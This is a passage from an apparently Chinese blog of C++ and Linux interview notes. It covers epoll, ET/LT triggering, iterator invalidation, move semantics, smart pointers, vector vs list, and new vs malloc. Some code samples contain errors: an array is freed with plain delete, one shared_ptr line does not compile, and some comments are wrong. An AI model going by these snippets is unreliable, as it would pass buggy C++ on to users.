<li>EPOLL_CTL_ADD添加事件：等于你往红黑树上添加一个节点，每个客户端连入服务器后，服务器都会产生一个对应的socket，每个连接这个socket值都不重复，所以，这个socket就是红黑树中的key，把这个节点添加到红黑树上去</li>
<li>EPOLL_CTL_MOD：修改事件，用了EPOLL_CTL_ADD把节点添加到红黑树上之后，才存在修改</li>
<li>EPOLL_CTL_DEL：是从红黑树上把这个节点干掉这会导致这个socket【这个tcp链接】上无法收到任何系统通知事件</li>
<li>sockid：表示客户端连接，就是你从accept()这个是红黑树里边的key;</li>
<li>event：事件信息，这里包括的是 一些事件信息EPOLL_CTL_ADD和EPOLL_CTL_MOD都要用到这个event参数里边的事件信息</li>
</ul>
</blockquote>
<h3 id="epoll-wait"><a href="#epoll-wait" class="headerlink" title="epoll_wait"></a>epoll_wait</h3><blockquote>
<ul>
<li>功能：阻塞一小段时间并等待事件发生，返回事件集合，也就是获取内核的事件通知</li>
</ul>
</blockquote>
<h3 id="与select相比"><a href="#与select相比" class="headerlink" title="与select相比"></a>与select相比</h3><p>网络编程中，当每个线程都要阻塞在 recv 等待对方的请求，如果访问的人多了，线程开的就多了，大量线程都在阻塞，系统运转速度也随之下降。这个时候，你需要多路复用技术。</p>
<p>select不能应付海量的网站访问，所以需要epoll</p>
<ul>
<li><p>select底层采用数组来管理套接字描述符，管理的数量有上限，不超过几千个；</p>
<p>而epoll使用树和链表来管理，同时管理数量可以更大</p>
</li>
<li><p>select不会告诉你到底哪个套接字来了消息，需要轮询；</p>
<p>epoll直接告诉谁来了消息</p>
</li>
<li><p>select进行系统调用，需要把套接字列表在用户空间和内核空间来回拷贝；</p>
<p>epoll统一在内核管理套接字描述符，无需来回拷贝</p>
</li>
</ul>
<h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>CSDN<a href="https://me.csdn.net/baidu_41388533">NGC_2070</a></p>
<h1 id="4-epoll-的-ET-模式和-LT-模式哪个更高效？"><a href="#4-epoll-的-ET-模式和-LT-模式哪个更高效？" class="headerlink" title="4. epoll 的 ET 模式和 LT 模式哪个更高效？"></a>4. epoll 的 ET 模式和 LT 模式哪个更高效？</h1><p>LT(level triggered) 默认&#x2F;缺省的工作方式，同时支持 block和no_block socket。这种工作方式下，内核会通知你一个fd是否就绪，然后才可以对这个就绪的fd进行I&#x2F;O操作。就算你没有任何操作，系统还是会继续提示fd已经就绪，不过这种工作方式出错会比较小，传统的select&#x2F;poll就是这种工作方式的代表。</p>
<p>ET(edge-triggered) 是高速工作方式，仅支持no_block socket，这种工作方式下，当fd从未就绪变为就绪时，内核会通知fd已经就绪，并且内核认为你知道该fd已经就绪，不会再次通知了，除非因为某些操作导致fd就绪状态发生变化。如果一直不对这个fd进行I&#x2F;O操作，导致fd变为未就绪时，内核同样不会发送更多的通知，因为only once。所以这种方式下，出错率比较高，需要增加一些检测程序。</p>
<p>PS:fd(文件描述符)</p>
<p><strong>LT可以理解为水平触发，只要有数据可以读，不管怎样都会通知。而ET为边缘触发，只有状态发生变化时才会通知，可以理解为电平变化</strong>。</p>
<p>来源<a href="https://blog.csdn.net/qq_37003559">编程哲学家</a></p>
<p>所以嘞：</p>
<p> ET 模式更加高效。<br>与 poll 的事件宏相比， epoll 新增了一个事件宏 EPOLLET ， 这就是所谓的边缘触发模式（<br>Edge Trigger ， ET ），而默认的模式称为水平触发模式（Level Trigger， LT ）。 对于水平触发模式，一个事件只要有，<strong>就会一直触发</strong>； 对于边缘触发模式，只有一个事件从无到有才会触发。</p>
<p>CSDN博主<a href="https://blog.csdn.net/Lushengshi/article/details/127580635">「丘比特惩罚陆」</a></p>
<h1 id="5-什么情况下C-STL迭代器会失效？"><a href="#5-什么情况下C-STL迭代器会失效？" class="headerlink" title="5.什么情况下C++STL迭代器会失效？"></a>5.什么情况下C++STL迭代器会失效？</h1><p>当容器调用 erase() 方法后，当前位置到容器末尾元素的所有迭代器全部失效。 当容器调用 insert() 方法后，当前位置到容器末尾元素的所有迭代器全部失效。 如果容器扩容，在其他地方重新又开辟了一块内存。原来容器底层的内存上所保存的迭代器全都失效了。</p>
<h1 id="6-什么是右值引用？和移动语义、完美转发有什么联系？"><a href="#6-什么是右值引用？和移动语义、完美转发有什么联系？" class="headerlink" title="6.什么是右值引用？和移动语义、完美转发有什么联系？"></a>6.什么是右值引用？和移动语义、完美转发有什么联系？</h1><p>它是移动语义和完美转发的基石，定义右值引用需要使用&amp;&amp;、右值引用一定不能被左值所初始 化，只能用右值初始化。</p>
<h2 id="左值"><a href="#左值" class="headerlink" title="左值"></a>左值</h2><p>有地址、数值、有存储空间的值，长期存在</p>
<p>左值<strong>是由某种存储支持的变量，左值有地址和值</strong>，可以出现在赋值运算符左边或右边</p>
<h2 id="左值引用"><a href="#左值引用" class="headerlink" title="左值引用"></a>左值引用</h2><p>左值引用仅仅接收左值，除非用了const兼容（非const的左值引用只接受左值），所以c++常用<strong>常量</strong>引用。</p>
<p><strong>它们兼容临时的右值和实际存在的左值变量</strong></p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">    int x=8;</span><br><span class="line">    int&amp; refx=x;</span><br><span class="line">    cout&lt;&lt;&quot;x: &quot;&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;&quot;refx: &quot;&lt;&lt;refx&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    refx=28;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;&quot;x: &quot;&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;&quot;refx: &quot;&lt;&lt;refx&lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>x: 8<br>refx: 8<br>x: 28<br>refx: 28</p>
</blockquote>
<p>在这个示例中，<code>refx</code> 是一个引用，它引用了变量 <code>x</code>。左值引用允许你通过 <code>refx</code> 修改 <code>x</code> 的值，因为引用绑定后，对引用的修改实际上是对被引用变量的修改。</p>
<p>需要注意的是，一旦引用绑定到某个变量，它会一直引用该变量，不能重新绑定到其他变量。因此，左值引用一般在绑定后不会再改变其引用对象。</p>
<p>左值引用在 C++ 中用于多种目的，例如通过函数引用传递变量、运算符重载以及为现有变量创建别名。</p>
<h2 id="右值"><a href="#右值" class="headerlink" title="右值"></a>右值</h2><p>就是临时量，无地址（或者有地址，但访问不到，只是一个临时量），没有存储空间而短暂存在的值</p>
<h2 id="右值引用"><a href="#右值引用" class="headerlink" title="右值引用"></a>右值引用</h2><p>c++11出现的</p>
<p>右值引用不能绑定到左值，可以通过常引用或右值引用延长右值的生命周期。</p>
<p>“有名字的右值引用”是左值</p>
<p>定义需要使用&amp;&amp;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int&amp;&amp; rref = 42; // rref 是一个右值引用，绑定到临时右值 42</span><br></pre></td></tr></table></figure>

<p><code>rref</code> 是一个右值引用，它可以绑定到一个临时右值，如字面值或表达式计算的结果。右值引用通常用于实现移动语义和完美转发（perfect forwarding），允许有效地管理资源并将参数传递到其他函数，同时避免不必要的数据复制。</p>
<p>需要注意的是，与左值引用不同，右值引用可以绑定到临时对象，但不能绑定到具有名称的左值。右值引用通常在函数参数中使用，例如在移动构造函数和移动赋值运算符中。</p>
<h3 id="1-string-foo-2-void-bar-string-amp-s-为什么下面的操作非法1-bar-foo-2-bar-“hello-world”"><a href="#1-string-foo-2-void-bar-string-amp-s-为什么下面的操作非法1-bar-foo-2-bar-“hello-world”" class="headerlink" title="1 string foo( ); 2 void bar(string &amp; s); 为什么下面的操作非法1 bar(foo( )); 2 bar(“hello world”);"></a>1 string foo( ); 2 void bar(string &amp; s); 为什么下面的操作非法1 bar(foo( )); 2 bar(“hello world”);</h3><ol>
<li><p><strong>Rvalue vs. Lvalue:</strong> 在 C++ 中，表达式可以被分为右值（Rvalue）和左值（Lvalue）。右值是临时的、不可修改的值，左值是可寻址的、可修改的值。函数返回的临时对象通常是右值，而具有名称的变量是左值。在 <code>bar(foo());</code> 中，<code>foo()</code> 返回一个临时的 <code>string</code> 对象，因此它是一个右值。</p>
</li>
<li><p><strong>Const Reference and Non-Const Reference:</strong> 函数参数可以是 const 引用（const reference）或非 const 引用。<code>string&amp; s</code> 表示非 const 引用，而 <code>const string&amp; s</code> 表示 const 引用。</p>
</li>
<li><p><code>bar(foo());</code>: 在这个操作中，<code>foo()</code> 返回的是右值，但 <code>bar</code> 函数的参数要求是非 const 引用，而右值不能直接绑定到非 const 引用，因此这个操作是非法的。</p>
</li>
<li><p><code>bar(&quot;hello world&quot;);</code>: <code>&quot;hello world&quot;</code> 是一个字符串字面量，它是右值，而 <code>bar</code> 函数的参数要求是非 const 引用，同样不能直接绑定到非 const 引用，因此这个操作也是非法的。</p>
</li>
</ol>
<p>解决：</p>
<ol>
<li>修改 <code>bar</code> 函数参数为 <code>const string&amp; s</code>，以允许将右值（临时对象）绑定到 const 引用参数。</li>
<li>在 <code>foo</code> 调用后创建一个命名的 <code>string</code> 变量，然后将这个变量传递给 <code>bar</code> 函数，因为左值可以绑定到非 const 引用参数。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void bar(const string&amp; s);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    string fooResult = foo();</span><br><span class="line">    bar(fooResult); // 合法，将左值传递给非 const 引用参数</span><br><span class="line"></span><br><span class="line">    bar(&quot;hello world&quot;); // 合法，将右值传递给 const 引用参数</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>可以取地址的，有名字的就是<strong>左值</strong></p>
<p>不能取地址的，没名字的就是<strong>右值</strong></p>
<p>int a&#x3D;b+c;&#x2F;&#x2F;a左值，变量名为a，&amp;a为其地址；b+c表达式、函数int func()返回值是右值</p>
<h2 id="移动语义"><a href="#移动语义" class="headerlink" title="移动语义"></a>移动语义</h2><p>c++11后出现的</p>
<h3 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h3><p>有时候我们需要单纯创建一些右值，赋给某个对象用作构造函数。</p>
<p>这个时候需要：</p>
<p>在main函数里创建这个右值对象，然后复制给这个对象相应的成员变量。</p>
<p>这里有一个额外行为，是<strong>复制</strong>。</p>
<p>如果我们可以直接把这个<strong>右值变量移动给成员变量</strong>，程序性能就会提高</p>
<p><strong>所以我们要移动对象，而不是复制它，这就有了语义的出现。</strong></p>
<p>看一下复制的情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string.h&gt;//strlen的头文件</span><br><span class="line">using namespace std;</span><br><span class="line">class String&#123;</span><br><span class="line">private:</span><br><span class="line">    char * m_data;</span><br><span class="line">    uint32_t m_size;</span><br><span class="line">public:</span><br><span class="line">    String()=default;</span><br><span class="line">    String(const char* str)//构造函数</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Created!\n&quot;);</span><br><span class="line">        m_size=strlen(str);</span><br><span class="line">        m_data=new char[m_size];</span><br><span class="line">        memcpy(m_data,str,m_size);</span><br><span class="line">    &#125;</span><br><span class="line">    String(const String&amp; other)//拷贝构造函数</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Copyed!\n&quot;);</span><br><span class="line">        m_size=other.m_size;</span><br><span class="line">        m_data=new char[m_size];</span><br><span class="line">        memcpy(m_data,other.m_data,m_size);</span><br><span class="line">    &#125;</span><br><span class="line">    ~String()</span><br><span class="line">    &#123;</span><br><span class="line">        delete m_data;</span><br><span class="line">    &#125;</span><br><span class="line">    void print()</span><br><span class="line">    &#123;</span><br><span class="line">        for (uint32_t i = 0; i &lt; m_size; i++)</span><br><span class="line">        &#123;</span><br><span class="line">           printf(&quot;%c&quot;,m_data[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        printf(&quot;\n&quot;);       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class entity&#123;</span><br><span class="line">private:</span><br><span class="line">    String m_name;</span><br><span class="line">public:</span><br><span class="line">    entity(const String&amp; name):m_name(name)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    void printname()</span><br><span class="line">    &#123;</span><br><span class="line">        m_name.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    entity e(String(&quot;yuleiyun&quot;));</span><br><span class="line">    e.printname();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Created!<br>Copyed!<br>yuleiyun</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String(const String&amp; other)//拷贝构造函数</span><br><span class="line">  &#123;</span><br><span class="line">      printf(&quot;Copyed!\n&quot;);</span><br><span class="line">      m_size=other.m_size;</span><br><span class="line">      m_data=new char[m_size];</span><br><span class="line">      memcpy(m_data,other.m_data,m_size);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>复制字符串，意味着我们需要在堆上分配内存，调用新字符</p>
<p>我们的主函数中写入了参数，然后调用的是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">entity(const String&amp; name):m_name(name)</span><br><span class="line">  &#123;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>为什么不能直接写进</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private:</span><br><span class="line">    String m_name;</span><br></pre></td></tr></table></figure>



<p>这就引入了移动语义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class String&#123;</span><br><span class="line">private:</span><br><span class="line">    char * m_data;</span><br><span class="line">    uint32_t m_size;</span><br><span class="line">public:</span><br><span class="line">    String()=default;</span><br><span class="line">    String(const char* str)//构造函数</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Created!\n&quot;);</span><br><span class="line">        m_size=strlen(str);</span><br><span class="line">        m_data=new char[m_size];</span><br><span class="line">        memcpy(m_data,str,m_size);</span><br><span class="line">    &#125;</span><br><span class="line">    String(const String&amp; other)//拷贝构造函数</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Copyed!\n&quot;);</span><br><span class="line">        m_size=other.m_size;</span><br><span class="line">        m_data=new char[m_size];</span><br><span class="line">        memcpy(m_data,other.m_data,m_size);</span><br><span class="line">    &#125;</span><br><span class="line">    String(String&amp;&amp; other) noexcept//右值引用拷贝，相当于移动（复制一次指针，原来的指针给nullptr）</span><br><span class="line">    &#123;</span><br><span class="line">     </span><br><span class="line">        printf(&quot;Moved!\n&quot;);</span><br><span class="line">           //新对象的指针指向指定内存，将旧对象的指针移开</span><br><span class="line">           //这里是接管了原来的旧内存</span><br><span class="line">        m_size=other.m_size;</span><br><span class="line">        m_data=other.m_data;</span><br><span class="line">        </span><br><span class="line">        //数据的转移，将other的数据偷走</span><br><span class="line">        other.m_size=0;</span><br><span class="line">        other.m_data=nullptr;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ~String()</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Desdroyed\n&quot;);</span><br><span class="line">        delete m_data;</span><br><span class="line">    &#125;</span><br><span class="line">    void print()</span><br><span class="line">    &#123;</span><br><span class="line">        for (uint32_t i = 0; i &lt; m_size; i++)</span><br><span class="line">        &#123;</span><br><span class="line">           printf(&quot;%c&quot;,m_data[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        printf(&quot;\n&quot;);       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class entity&#123;</span><br><span class="line">private:</span><br><span class="line">    String m_name;</span><br><span class="line">public:</span><br><span class="line">    entity(const String&amp; name):m_name(name)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    entity(String&amp;&amp; name):m_name(move(name))//或者(String&amp;&amp;)name</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    void printname()</span><br><span class="line">    &#123;</span><br><span class="line">        m_name.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    entity e(String(&quot;yuleiyun&quot;));</span><br><span class="line">    e.printname();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Created!<br>Moved!<br>Desdroyed<br>yuleiyun<br>Desdroyed</p>
</blockquote>
<p><code>String(String&amp;&amp; other) noexcept</code></p>
<blockquote>
<p>该<code>&amp;&amp;</code>语法用于定义移动构造函数，它是一种特殊类型的构造函数，允许将资源（如动态分配的内存）从一个对象有效传输到另一个对象。</p>
<p>在 C++ 中，移动构造函数是使用右值引用作为参数来定义的。<code>&amp;&amp;</code>表示这是一个右值引用参数，并且它允许在从右值（临时）对象构造对象或显式转换为右值引用时调用移动<code>other</code>构造函数。</p>
</blockquote>
<p>当一个表达式出现的形式表示它是一个右值，就是告诉编译器，我以后不会再用到这个资源，放心大胆的转移销毁，这就可以做优化，比如节省拷贝之类的。 move的作用是无条件的把表达式转成右值</p>
<p>来源 <a href="https://zhuanlan.zhihu.com/p/553405837">知乎</a></p>
<h1 id="7-智能指针定义、类别和应用场景"><a href="#7-智能指针定义、类别和应用场景" class="headerlink" title="7.智能指针定义、类别和应用场景"></a>7.智能指针定义、类别和应用场景</h1><p>作用是管理一个指针。</p>
<p>存在以下这种情况：</p>
<p>申请的空间在函数结束时忘记释放，造成内存泄漏。通过智能指针避免该问题。</p>
<p>智能指针是一个类，当超出了类的实例对象的作用域时，会自动调用对象的析构函数，析构函数会自动释放资源。</p>
<p>其作用原理就是：<strong>在函数结束时自动释放内存空间，不需要手动释放内存空间。</strong></p>
<p>unique_ptr独占式，同一时间只允许一个智能指针指向该对象</p>
<p>shared_ptr共享式，多个智能指针指向同一个对象，当最后一个引用被销毁时，就会释放对象和其相关资源</p>
<p>weak_ptr 是一种不控制对象生命周期的智能指针 , 它指向 一个 shared_ptr 管理的对象 . 进行该对象的内存管理的是那个强引用的 shared_ptr ， weak_ptr 只是提供了对管理对象的一个访问手段。</p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>本质上是原始指针的包装。当你创建一个智能指针，它会调用new并为你分配内存，然后基于你使用的智能指针，这些内存会在某一时刻自动释放。</p>
<p>优先使用unique_ptr，其次考虑shared_ptr</p>
<blockquote>
<p>尽量使用unique_ptr因为它有一个较低的开销，但如果你需要在对象之间共享，不能使用unique_ptr的时候，就使用shared_ptr</p>
</blockquote>
<p><strong>访问所有智能指针，先要有头文件&lt;memory&gt;</strong></p>
<h2 id="作用域指针unique-ptr的使用"><a href="#作用域指针unique-ptr的使用" class="headerlink" title="作用域指针unique_ptr的使用"></a>作用域指针unique_ptr的使用</h2><ul>
<li><p>作用域指针意味着，超出作用域，就会被销毁，调用delete</p>
</li>
<li><p>唯一、不可复制、不可共享</p>
</li>
</ul>
<blockquote>
<p>如果复制一个unique_ptr，会有两个指针，两个unique_ptr指向同一个内存块，如果其中一个死了，它会释放那段内存，也就是说，指向同一块内存的第二个unique_ptr指向了已经被释放的内存。</p>
</blockquote>
<ul>
<li>unique_ptr 需要显示调用构造函数</li>
<li>最好使用 unique_ptr&lt;Entity&gt; entity&#x3D;make_unique&lt;Entity&gt;();以防构造函数抛出异常，得到一个没有引用的空指针而造成内存泄露，稍安全点</li>
<li>make_unique&lt;&gt;() c++14引入</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;memory&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">class Entity&#123;</span><br><span class="line">private:</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    Entity()</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;Create!&quot; &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~Entity()</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;Destroy!&quot; &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">       void Print()&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">        //unique_ptr&lt;Entity&gt; entity = new Entity(); //错误，unique_ptr不能隐式转换</span><br><span class="line">        //unique_ptr&lt;Entity&gt; entity(new Entity()); //可以，但不建议说是</span><br><span class="line">        unique_ptr&lt;Entity&gt; entity=make_unique&lt;Entity&gt;();</span><br><span class="line">        entity-&gt;Print();//像一般原始指针的使用方式</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Create!<br>Destroy!</p>
</blockquote>
<h2 id="共享指针shared-ptr"><a href="#共享指针shared-ptr" class="headerlink" title="共享指针shared_ptr"></a>共享指针shared_ptr</h2><ul>
<li>其工作方式 <strong>通过引用计数</strong></li>
</ul>
<blockquote>
<p>引用计数基本上是一种方法，可以跟踪你的指针有多少个引用，一旦引用计数达到零，他就被删除了。<br>例如：我创建了一个共享指针shared_ptr，我又创建了另一个shared_ptr来复制它，我的引用计数是2，第一个和第二个，共2个。当第一个死的时候，我的引用计数器现在减少1，然后当最后一个shared_ptr死了，我的引用计数回到零，内存就被释放。</p>
</blockquote>
<ul>
<li>该指针需要分配另一块内存，叫控制块，存储引用计数</li>
</ul>
<blockquote>
<p>首先创建一个new Entity，然后传递给shared_ptr构造函数，它必须分配两次；</p>
<p>用make_shared组合起来更有效率、</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">std::shared_ptr&lt;Entity&gt; sharedEntity = sharedEntity(new Entity());//不推荐！</span><br><span class="line">std::shared_ptr&lt;Entity&gt; sharedEntity = std::make_shared&lt;Entity&gt;();//ok</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">        &#123;</span><br><span class="line">        std::shared_ptr&lt;Entity&gt; e;</span><br><span class="line">        &#123;</span><br><span class="line">        //  std::shared_ptr&lt;Entity&gt; sharedEntity = sharedEntity(new Entity());//不推荐！</span><br><span class="line">            std::shared_ptr&lt;Entity&gt; sharedEntity = std::make_shared&lt;Entity&gt;();//ok</span><br><span class="line">            e = sharedEntity; //可以复制</span><br><span class="line">        &#125; //此时sharedEntity已经“死了”,但没有调用析构，因为e仍然是活的，并且持有对该Entity的引用，此时计数由2-》1</span><br><span class="line">    &#125; //析构被调用，因为所有的引用都消失了，计数由2-&gt;0，内存被释放</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    std::cin.get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Create!<br>Destroy!</p>
</blockquote>
<p>注：main函数的花括号是为了让括号内的内容为局部对象，方便测试</p>
<h2 id="弱指针weak-ptr"><a href="#弱指针weak-ptr" class="headerlink" title="弱指针weak_ptr"></a>弱指针weak_ptr</h2><ul>
<li>可以和shared_ptr一起使用</li>
<li>该指针可以被复制，但 <strong>不会增加额外的控制块来计数</strong>，仅仅声明该指针活着</li>
</ul>
<blockquote>
<p>当你将一个shared_ptr赋值给另外一个shared_ptr，引用计数++，而若是<strong>把一个shared_ptr赋值给一个weak_ptr时，它不会增加引用计数</strong>。这很好，如果你不想要Entity的所有权，就像你可能在排序一个Entity列表，你不关心它们是否有效，你只需要存储它们的一个引用就可以了。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">&#123;</span><br><span class="line">    std::weak_ptr&lt;Entity&gt; e0;</span><br><span class="line">    &#123;</span><br><span class="line">        std::shared_ptr&lt;Entity&gt; sharedEntity = std::make_shared&lt;Entity&gt;();</span><br><span class="line">        e0 = sharedEntity;</span><br><span class="line">    &#125; //此时，此析构被调用，内存被释放</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它指向一个 shared_ptr 管理的对象 . 进行该对象的内存管理的是那个强引用的 shared_ptr ， weak_ptr 只是提供了对管理对象的一个访问手段。</p>
<h1 id="8-vector-和-list-有什么区别？"><a href="#8-vector-和-list-有什么区别？" class="headerlink" title="8.vector 和 list 有什么区别？"></a>8.vector 和 list 有什么区别？</h1><p> vector 和 built-in 数组类似，它拥有一段<strong>连续的内存空间</strong>，并且起始地址不变，因此它能非常好的支持<strong>随即存取</strong>，即[] 操作符，但由于它的内存空间是连续的，所以在中间进行插入和删除会造成内存块的拷贝，另外，当该数组后的内存空间不够时，需要重新申请一块足够大的内存并进行内存的拷贝。</p>
<p>它的emplace_back()体现了零拷贝技术，虽然后push_back()作用一样，但不需要调用拷贝构造函数和转移构造函数，而是原地构造该元素</p>
<p> list 就是数据结构中的双向链表，它的内存空间<strong>可以是不连续的</strong>，通过<strong>指针来进行数据的访问</strong>， 这个特点使得它的随即存取变的非常没有效率，因此它没有提供[]操作符的重载。<strong>支持任意地方的删除和插入</strong></p>
<p>vector 适用：对象数量变化少，简单对象，随机访问元素频繁；</p>
<p>list 适用：对象数量变化大，对象复杂，插入和删除频繁</p>
<h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><p><strong>C++ STL</strong>中提供的一种<strong>容器</strong>，是<strong>线性的双向链表</strong>的数据结构。拥有<strong>链式结构的特征</strong>：<strong>支持元素的快速插入和删除，但是元素随机访问较慢（相较于vector容器），不提供[]运算符的重载</strong>。C++中使用list容器需要包含<strong>头文件<list><strong>，把list当做</strong>双向链表</strong>来看</p>
<p>基本操作</p>
<blockquote>
<p>push_back()</p>
<p>push_front();</p>
<p>pop_</p>
<p>merge()&#x2F;&#x2F;两个list表必须事先有序</p>
<p>sort()</p>
</blockquote>
<h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><p>向量</p>
<p>与数组相比其优点在于它能够根据需要随时自动调整自身的大小以便容下所要放入的元素。</p>
<blockquote>
<p>插入 - insert</p>
<p>​    ①、a.insert(a.begin(), 1000);<em>&#x2F;&#x2F;将1000插入到向量a的起始位置前</em></p>
<p>​    ②、a.insert(a.begin(), 3, 1000);<em>&#x2F;&#x2F;将1000分别插入到向量元素位置的0-2处(共3个元素)</em></p>
<p>​    ③、 vector&lt;int&gt; a(5, 1) ;</p>
<p>​        vector&lt;int&gt; b(10) ;</p>
<p>​        b.insert(b.begin(), a.begin(), a.end()) ; <em>&#x2F;&#x2F;将a.begin(), a.end()之间的全部元素插入到b.begin()前</em></p>
<p>删除 - erase</p>
<p>​    ①、b.erase(b.begin());<em>&#x2F;&#x2F;将起始位置的元素删除</em></p>
<p>​    ②、b.erase(b.begin(), b.begin()+3);<em>&#x2F;&#x2F;将(b.begin(), b.begin()+3)之间的元素删除</em></p>
<p>交换 - swap</p>
<p>​        b.swap(a) ;            <em>&#x2F;&#x2F;a向量与b向量进行交换</em></p>
</blockquote>
<h1 id="9-C-内存-new-与-malloc-区别是什么？"><a href="#9-C-内存-new-与-malloc-区别是什么？" class="headerlink" title="9. C++内存 new 与 malloc 区别是什么？"></a>9. C++内存 new 与 malloc 区别是什么？</h1><ol>
<li><p>申请的内存所在位置；</p>
<blockquote>
<p>new：此操作符分配的内存空间是在自由存储区；</p>
<p>malloc：申请的内存是在堆空间。</p>
<p>堆 </p>
<p>​	是C语言和操作系统的术语，堆是操作系统所维护的一块特殊内存，它提供了动态分配的功能，当运行程序调用malloc()时就会从中分配，调用free()归还内存。</p>
<p>自由存储区 </p>
<p>​	是C++中动态分配和释放对象的一个概念，通过new分配的内存区域可以称为自由存储区，通过delete释放归还内存。自由存储区可以是堆、全局&#x2F;静态存储区等，具体是在哪个区，主要还是要看new的实现以及C++编译器默认new申请的内存是在哪里。但是基本上，很多C++编译器默认使用堆来实现自由存储，运算符new和delete内部默认是使用malloc和free的方式来被实现，说它在堆上也对，说它在自由存储区上也正确。因为在C++中new和delete符号是可以重载的，我们可以重新实现new的实现代码，可以让其分配的内存位置在静态存储区等。而malloc和free是C里的库函数，无法对其进行重载。</p>
<p>CSDN博主<a href="https://blog.csdn.net/weixin_46094676/article/details/129677525">「呆萌理科生」</a></p>
</blockquote>
</li>
<li><p>返回类型安全性；</p>
<blockquote>
<p>new分配内存成功，则返回<strong>对象类型的指针</strong>，使用new是类型安全的；而malloc分配成功会返回void*类型指针，需要通过强制类型转换</p>
</blockquote>
</li>
<li><p>内存分配失败时的返回值；</p>
<blockquote>
<p>C++标准中new如果分配内存失败要求抛出bad_alloc异常，需要自己捕捉，但是有些编译器对C++标准的适配没那么好，也会返回null指针，这是保留了C的处理。</p>
<p>而malloc分配失败则会返回null指针。</p>
</blockquote>
</li>
<li><p>是否需要指定的内存大小；</p>
<blockquote>
<p>使用malloc为对象指针分配内存，要<strong>明确</strong>指定分配内存的大小，而new不需要</p>
<p>malloc返回的指针还需要进行强制类型转换才赋值给A<em>的指针对象，而使用new则不需要，直接返回的是A</em>的指针。</p>
</blockquote>
</li>
<li><p>是否调用构造函数&#x2F;析构函数；</p>
<blockquote>
<p>new调用时先为对象分配内存，再调用对象的构造函数，delete会调用析构函数</p>
<p>而malloc不会</p>
